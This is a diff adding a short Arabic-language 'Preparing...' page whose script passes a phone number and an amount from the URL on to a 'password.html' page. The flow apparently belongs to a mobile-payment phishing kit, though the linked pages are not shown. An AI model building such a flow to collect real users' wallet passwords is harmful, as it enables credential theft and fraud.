@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>جاري التجهيز...</title>
+    <script>
+        window.onload = function() {
+            const params = new URLSearchParams(window.location.search);
+            const phone = params.get('phone');
+            const amount = params.get('amount');
+            
+            if (phone && amount) {
+                window.location.href = 'password.html?phone=' + encodeURIComponent(phone) + '&amount=' + encodeURIComponent(amount);
+            } else {
+                window.location.href = 'conversion.html';
+            }
+        };
+    </script>
+</head>
+<body>
+    <div style="display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Cairo', sans-serif; background-color: #f4f4f4;">
+        جاري التجهيز...
+    </div>
+</body>
+</html>
